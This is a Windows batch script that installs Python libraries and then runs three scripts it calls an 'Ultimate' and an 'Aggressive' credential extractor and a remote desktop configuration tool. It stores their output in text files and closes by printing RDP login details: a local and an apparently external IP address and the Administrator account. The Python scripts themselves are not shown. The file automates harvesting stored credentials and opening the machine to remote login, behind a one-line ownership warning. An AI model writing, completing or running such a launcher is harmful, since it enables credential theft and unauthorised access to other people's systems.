@echo off

echo ========================================
echo CREDENTIAL EXTRACTOR AND REMOTE DESKTOP TOOL
echo ========================================
echo.
echo This will install dependencies and run ALL tools automatically
echo.

echo WARNING: This tool extracts sensitive credentials from your system.
echo Only use this tool on systems you own and have permission to access.
echo.

echo ========================================
echo STEP 1: DETECTING PYTHON INSTALLATION
echo ========================================
echo.

echo Checking for Python installation...

REM Try python3 first
python3 --version >nul 2>&1
if %errorlevel% equ 0 (
    set PYTHON_CMD=python3
    python3 --version
    echo Found Python3 - using python3 command
    goto :install_deps
)

REM Try python
python --version >nul 2>&1
if %errorlevel% equ 0 (
    set PYTHON_CMD=python
    python --version
    echo Found Python - using python command
    goto :install_deps
)

REM No Python found
echo ERROR: No Python installation found!
echo Please install Python 3.x from https://python.org
echo.
exit /b 1

:install_deps
echo.
echo ========================================
echo STEP 2: INSTALLING DEPENDENCIES
echo ========================================
echo Installing all required libraries...
echo.

echo Installing pywin32...
%PYTHON_CMD% -m pip install pywin32 pywin32-ctypes
if %errorlevel% neq 0 (
    echo Warning: pywin32 installation failed - continuing anyway
)

echo.
echo Installing cryptography libraries...
%PYTHON_CMD% -m pip install pycryptodome cryptography pycryptodomex
if %errorlevel% neq 0 (
    echo Warning: cryptography installation failed - continuing anyway
)

echo.
echo Installing system access libraries...
%PYTHON_CMD% -m pip install keyring psutil
if %errorlevel% neq 0 (
    echo Warning: system libraries installation failed - continuing anyway
)

echo.
echo Installing network libraries...
%PYTHON_CMD% -m pip install requests
if %errorlevel% neq 0 (
    echo Warning: requests installation failed - continuing anyway
)

echo.
echo Installing XML processing...
%PYTHON_CMD% -m pip install lxml
if %errorlevel% neq 0 (
    echo Warning: lxml installation failed - continuing anyway
)

echo.
echo Installing additional utilities...
%PYTHON_CMD% -m pip install colorama tqdm
if %errorlevel% neq 0 (
    echo Warning: utilities installation failed - continuing anyway
)

echo.
echo Installing memory access libraries...
%PYTHON_CMD% -m pip install pymem
if %errorlevel% neq 0 (
    echo Warning: pymem installation failed - continuing anyway
)

echo.
echo Installation complete!
echo.

echo ========================================
echo STEP 3: RUNNING ALL PYTHON TOOLS
echo ========================================
echo.

echo [1/3] Running Ultimate Credential Extractor (ultimate.py)...
echo Output: output1.txt
%PYTHON_CMD% ultimate.py > output1.txt 2>&1
if %errorlevel% equ 0 (
    echo Ultimate extractor completed successfully
) else (
    echo Ultimate extractor failed
)
echo.

echo [2/3] Running Aggressive Credential Extractor (aggressive.py)...
echo Output: output2.txt
%PYTHON_CMD% aggressive.py > output2.txt 2>&1
if %errorlevel% equ 0 (
    echo Aggressive extractor completed successfully
) else (
    echo Aggressive extractor failed
)
echo.

echo [3/3] Running Remote Desktop Configuration (remote.py)...
echo Output: output3.txt
%PYTHON_CMD% remote.py > output3.txt 2>&1
if %errorlevel% equ 0 (
    echo Remote desktop configuration completed successfully
) else (
    echo Remote desktop configuration failed
)
echo.

echo ========================================
echo CREATING SUMMARY REPORT
echo ========================================
echo Creating summary report...
echo SUMMARY REPORT > summary.txt
echo =============== >> summary.txt
echo Generated: %date% %time% >> summary.txt
echo Python Command Used: %PYTHON_CMD% >> summary.txt
echo. >> summary.txt
echo PYTHON TOOLS EXECUTED: >> summary.txt
echo - ultimate.py (Ultimate Credential Extractor) >> summary.txt
echo - aggressive.py (Aggressive Credential Extractor) >> summary.txt
echo - remote.py (Remote Desktop Configuration) >> summary.txt
echo. >> summary.txt
echo OUTPUT FILES CREATED: >> summary.txt
echo - output1.txt (Ultimate extractor results) >> summary.txt
echo - output2.txt (Aggressive extractor results) >> summary.txt
echo - output3.txt (Remote desktop configuration) >> summary.txt
echo - summary.txt (This summary report) >> summary.txt
echo. >> summary.txt
echo IMPORTANT SECURITY NOTES: >> summary.txt
echo - All output files contain sensitive information >> summary.txt
echo - Store them securely and delete when no longer needed >> summary.txt
echo - Do not share these files with unauthorized parties >> summary.txt
echo. >> summary.txt

echo ========================================
echo ALL TOOLS EXECUTION COMPLETED!
echo ========================================
echo.
echo PYTHON COMMAND USED: %PYTHON_CMD%
echo.
echo OUTPUT FILES CREATED:
echo - output1.txt (Ultimate credential extractor)
echo - output2.txt (Aggressive credential extractor)
echo - output3.txt (Remote desktop configuration)
echo - summary.txt (Summary report)
echo.
echo IMPORTANT SECURITY NOTES:
echo - All output files contain sensitive information
echo - Store them securely and delete when no longer needed
echo - Do not share these files with unauthorized parties
echo.
echo ========================================
echo REMOTE DESKTOP CONNECTION INFO
echo ========================================
echo To connect to this PC via Remote Desktop:
echo 1. Open Remote Desktop Connection (mstsc)
echo 2. Enter IP: 192.168.174.128 (local) or 70.39.70.194 (external)
echo 3. Username: Administrator
echo 4. Enter your password
echo 5. Click Connect
echo.
echo All tools have been executed successfully!
echo.